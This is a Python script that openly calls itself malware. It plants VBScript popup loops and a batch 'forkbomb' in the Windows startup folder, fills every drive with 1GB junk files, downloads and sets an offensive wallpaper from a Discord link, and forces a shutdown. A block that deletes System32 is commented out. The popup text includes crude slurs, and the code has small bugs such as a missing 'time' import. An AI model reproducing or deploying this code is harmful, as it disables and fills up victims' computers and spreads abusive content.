import winshell
import shutil
import os
import ctypes
import requests
import string
import psutil
import random
  
# Warning message
Password=input("Please enter the password: ")
if Password=='OilyChineseBoy1945':
  print("Access granted.")
else:
  print("Access denied.")
  quit()
Warning=input("Warning, you are about to run malware that may cause irreversible damage to your pc once it is run. The creator will not be held liable for any damages to your PC. Proceed? (Y/N) ")
if Warning=='Y':
 print("Beginning installation...")
elif Warning=='N':
 print("Quitting...")
 quit()

# Locate startup directory
startup_directory = winshell.startup()

# Locate home directory
home_directory = os.path.expanduser('~')

# Create text file
text_directory= "muaaz.txt"
with open(text_directory, "w") as text_file:
  text_file.write('Your PC has been thoroughly eaten by a sleazy oily Muaaz. If you want to fix it, too bad.')

# Create the "errorbox" file
errorbox_directory = "errorbox.vbs"
with open(errorbox_directory, "w") as vbs_file:
    vbs_file.write('x=MsgBox("Congratulations, you have won an STD!", vbOkOnly+vbCritical, "LMAO")\n')
    vbs_file.write('x=MsgBox("Aw come on, dont go.", vbOkOnly+vbCritical, "LMAO")\n')
    vbs_file.write('x=MsgBox("Give up.", vbOkOnly+vbCritical, "LMAO")\n')
    vbs_file.write('x=MsgBox("Where are you going?", vbOkOnly+vbCritical, "LMAO")\n')
    vbs_file.write('x=MsgBox("Nice try.", vbOkOnly+vbCritical, "LMAO")\n')
    vbs_file.write('do\n')
    vbs_file.write('x=MsgBox("I refuse to be closed.", vbOkOnly+vbCritical, "LMAO")\n')
    vbs_file.write('loop\n')

# Create the "imagebox" file
imagebox_directory = "imagebox.vbs"
with open(imagebox_directory, "w") as vbs_file:
  vbs_file.write('Set objExplorer = CreateObject("InternetExplorer.Application")\n')
  vbs_file.write('With objExplorer\n')
  vbs_file.write('.Navigate "about:blank"\n')
  vbs_file.write('.ToolBar = 0\n')
  vbs_file.write('.StatusBar = 0\n')
  vbs_file.write('.Left = 200\n')
  vbs_file.write('.Top = 200\n')
  vbs_file.write('.Width = 200\n')
  vbs_file.write('.Height = 250\n')
  vbs_file.write('.Visible = 1\n')
  vbs_file.write('.Document.Title = "get muazzed"\n')
  vbs_file.write('.Document.Body.InnerHTML = _ \n')
  vbs_file.write('"<img src='+"'https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png'"+'height=200 width=200>"\n')
  vbs_file.write(' End With\n')

# Create the "forkbomb" file
forkbomb_directory = "forkbomb.bat"
with open(forkbomb_directory, "w") as bat_file:
  bat_file.write('do\n')
  for bomb in range (25):
    bat_file.write('start errorbox.vbs\n')
    bat_file.write('start imagebox.vbs\n')
  bat_file.write('loop\n')

# Create file that deletes System32 on boot
#sysdel_directory = "sysdel.vbs"
#with open(sysdel_directory, "w") as vbs_file:
#  vbs_file.write('Dim FSO, Folder')
#  vbs_file.write('set FSO=CreateObject("Scripting.FileSystemObject")')
#  vbs_file.write('Folder="C:\Windows\System32"')
#  vbs_file.write('FSO.DeleteFolder(Folder)')

# Move the "startup" file to the startup directory
shutil.move(text_directory, startup_directory)
shutil.move(errorbox_directory, startup_directory)
shutil.move(imagebox_directory, startup_directory)
shutil.move(forkbomb_directory, startup_directory)
#shutil.move(sysdel_directory, startup_directory)
print("Files moved successfully.")

# Random Text Generator
def generate_random_text(size):
    # Generate random text of given size
    letters = string.ascii_lowercase + string.ascii_uppercase
    return ''.join(random.choice(letters) for _ in range(size))

# Fills all drives with 1GB TXT files until they have no space left
def create_system_files():
    # Get a list of available drives
    drives = psutil.disk_partitions()

    for drive in drives:
        drive_name = drive.device
        drive_free_space = psutil.disk_usage(drive_name).free

        # Check if drive has at least 1GB of free space
        if drive_free_space >= 1e9:
            folder_path = os.path.join(drive_name, "SystemFiles")

            # Create the folder if it doesn't exist
            if not os.path.exists(folder_path):
                os.mkdir(folder_path)

            # Fill the folder with 1GB text files until less than 1GB of free space is left
            while drive_free_space >= 1e9:
                file_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
                file_path = os.path.join(folder_path, file_name + ".txt")
                text = generate_random_text(int(1e9))  # Generate 1GB of random text

                # Write the text to the file
                with open(file_path, "w") as file:
                    file.write(text)

                # Update the free space on the drive
                drive_free_space = psutil.disk_usage(drive_name).free

            print(f"Filled {drive_name} with 1GB text files.")

create_system_files()

# Changes wallpaper
time.sleep(8)
wallpaper_url="https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
response = requests.get(wallpaper_url)
image_data = response.content
wallpaper_file = "wallpaper.png"
with open (wallpaper_file ,"wb") as file:
    file.write(image_data)
ctypes.windll.user32.SystemParametersInfoW(20,0, os.path.abspath(wallpaper_file), 3)    
os.remove("wallpaper_file")

# Shut down user's computer so the carnage can begin.
time.sleep(10)
print("Shutting down...")
os.system("shutdown /s /t 1")
